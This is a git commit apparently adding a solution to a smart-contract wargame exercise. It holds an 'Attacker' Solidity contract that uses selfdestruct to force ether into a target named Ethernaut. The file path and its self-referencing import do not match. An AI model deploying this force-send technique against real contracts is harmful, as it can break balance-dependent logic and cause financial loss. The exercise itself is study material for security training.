0067be0f9340ed8ab83f1fb19d28d68ea71f3988
ahsenriaz <ahsenriaz2001@gmail.com>
2022-12-05 02:42:58 +0500

    Forcefully Send Ether

---
+++ contracts/ForcefullySendEther/Ethernaut.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./Ethernaut.sol";
+
+contract Attacker {
+    Ethernaut ethernaut;
+
+    constructor(address _ethernaut) {
+        ethernaut = Ethernaut(_ethernaut);
+    }
+
+  function attack() public payable {
+      selfdestruct(payable(address(ethernaut)));
+  }
+}
